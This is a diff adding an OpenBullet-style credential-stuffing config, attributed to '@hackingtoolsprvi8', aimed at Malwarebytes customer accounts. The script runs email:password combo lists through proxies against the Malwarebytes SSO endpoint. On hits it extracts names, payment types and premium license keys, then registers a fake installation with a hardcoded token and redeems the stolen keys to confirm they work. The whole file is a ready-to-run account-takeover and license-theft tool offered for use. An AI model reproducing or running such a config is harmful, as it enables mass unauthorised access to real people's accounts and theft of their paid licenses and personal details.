@@ -1,0 +1,151 @@
+[SETTINGS]
+{
+  "Name": "Malwarbytes(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-28T08:19:46.9268171+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://my-sso.malwarebytes.com/auth" 
+  CONTENT "{\"email\": \"<USER>\", \"password\": \"<PASS>\", \"generate_holocron_token\": true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: my-sso.malwarebytes.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: MBAM/4.3.0.98 (build: 1.0.1173; Windows 10.0.18042)" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Language: en-US,*" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Login_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+    KEY "account_set_up_disabled" 
+    KEY "account_set_up_required" 
+  KEYCHAIN Success OR 
+    KEY "auth" 
+  KEYCHAIN Retry OR 
+    KEY "access_locked" 
+
+#Name PARSE "<SOURCE>" LR "first_name\":\"" "\",\"last_name\":\"" CreateEmpty=FALSE -> CAP "Name:-" 
+
+#Payment PARSE "<SOURCE>" LR "type\":{\"name\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Payment:-" 
+
+#Token PARSE "<SOURCE>" LR "holocron_user_token\":\"" "\"}" -> VAR "bt" 
+
+#Lt_Token REQUEST POST "https://holocron.mwbsys.com/graphql" 
+  CONTENT "{                 \"query\":                  \"query($where: ViewerWhereInput) {                   viewer{                    keystoneKeys(where: $where) {                     licenseKey                     default                    }                   }                  }\",                 \"variables\": {                  \"where\": {                   \"product\": \"premium\"                  }                 }                }" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: holocron.mwbsys.com" 
+  HEADER "Authorization: Bearer <bt>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Language: en-US,*" 
+  HEADER "User-Agent: Mozilla/5.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#Lt PARSE "<SOURCE>" LR "\"licenseKey\":\"" "\",\"" Recursive=TRUE -> VAR "lt" 
+
+#Countt FUNCTION CountOccurrences "," "<lt>" -> VAR "ctt" 
+
+#Count FUNCTION Compute "<ctt>+1" -> VAR "ct" 
+
+IF "<ctt>" Contains "0"
+IF "<SOURCE>" Contains "true"
+
+#Mi FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d" -> VAR "mi" 
+
+#Install_Token REQUEST POST "https://keystone.mwbsys.com//api/v1/installations/register.json" 
+  CONTENT "{\"machine_id\" : \"<mi>\",\"product_build\" : \"consumer\",\"product_code\" : \"MBAM-C\",\"product_version\" : \"4.3.0\",\"tags\" : \"{\\\\u000a   \\\"affiliate_id\\\" : \\\"\\\",\\\\u000a   \\\"affiliate_name\\\" : \\\"\\\",\\\\u000a   \\\"antivirus\\\" : [\\\\u000a      \\\"Windows Defender\\\"\\\\u000a   ],\\\\u000a   \\\"biz_env\\\" : false,\\\\u000a   \\\"domain_devices\\\" : 0,\\\\u000a   \\\"domain_name\\\" : \\\"\\\",\\\\u000a   \\\"is_on_domain\\\" : false,\\\\u000a   \\\"license_state\\\" : \\\"trialExpired\\\",\\\\u000a   \\\"os\\\" : \\\"Windows 10 (Build 14393.2189)\\\",\\\\u000a   \\\"os_build\\\" : \\\"14393\\\",\\\\u000a   \\\"unredeem_reason\\\" : \\\"\\\",\\\\u000a   \\\"user_is_admin\\\" : false\\\\u000a}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: MBAM-C/4.3.0.98/consumer" 
+  HEADER "Authorization: Token token=\"PibtEHLM7kuWpRZ678pd\"" 
+  HEADER "Connection: Close" 
+  HEADER "Host: keystone.mwbsys.com" 
+
+#IT PARSE "<SOURCE>" LR "installation_token\":\"" "\",\"" -> VAR "it" 
+
+#Key_Chekcer REQUEST POST "https://keystone.mwbsys.com//api/v1/installations/redeem.json" 
+  CONTENT "{ \"installation_token\" : \"<it>\",  \"license_key\" : \"<lt>\",  \"tags\" : \"{\\\\u000a   \\\"affiliate_id\\\" : \\\"\\\",\\\\u000a   \\\"affiliate_name\\\" : \\\"\\\",\\\\u000a   \\\"antivirus\\\" : [\\\\u000a      \\\"Windows Defender\\\"\\\\u000a   ],\\\\u000a   \\\"biz_env\\\" : false,\\\\u000a   \\\"domain_devices\\\" : 0,\\\\u000a   \\\"domain_name\\\" : \\\"\\\",\\\\u000a   \\\"is_on_domain\\\" : false,\\\\u000a   \\\"license_state\\\" : \\\"trialExpired\\\",\\\\u000a   \\\"os\\\" : \\\"Windows 10 (Build 14393.2189)\\\",\\\\u000a   \\\"os_build\\\" : \\\"14393\\\",\\\\u000a   \\\"unredeem_reason\\\" : \\\"\\\",\\\\u000a   \\\"user_is_admin\\\" : false\\\\u000a}\"    }" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: MBAM-C/4.3.0.98/consumer" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Enable-Catalog-Enforcement: true" 
+  HEADER "Authorization: Token token=\"PibtEHLM7kuWpRZ678pd\"" 
+  HEADER "Connection: Close" 
+  HEADER "Host: keystone.mwbsys.com" 
+
+#Sub PARSE "<SOURCE>" LR ",\"name\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Subscription:-" 
+
+#Expriy PARSE "<SOURCE>" LR "\":{\"term_ends_on\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry On:-" 
+
+#Renew PARSE "<SOURCE>" LR ",\"auto_renew\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Auto Renew:-" 
+
+#Trial PARSE "<SOURCE>" LR ",\"is_trial_allowed\":" ",\"" CreateEmpty=FALSE -> CAP "Trial:-" 
+
+ELSE
+
+#LK FUNCTION Constant "** <ct> ** so LOGIN and Check Manual its Valid or NOT !!" -> CAP "Number of License Keys" 
+
+ELSE
+ENDIF
+
+#LK_Keys FUNCTION Constant "<lt>" -> CAP "LicenseKeys:-" 
+
+#Final_Check KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"data\":{\"viewer\":{\"keystoneKeys\":[]}}}" 
+  KEYCHAIN Success OR 
+    KEY "volume_maxed" 
+    KEY "status\":\"ok" 
+    KEY "<ct>" GreaterThan "1" 
+  KEYCHAIN Retry OR 
+    KEY "installation_token_not_found" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "The current license entitlement has expired" 
+    KEY "The License Key has been refunded" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
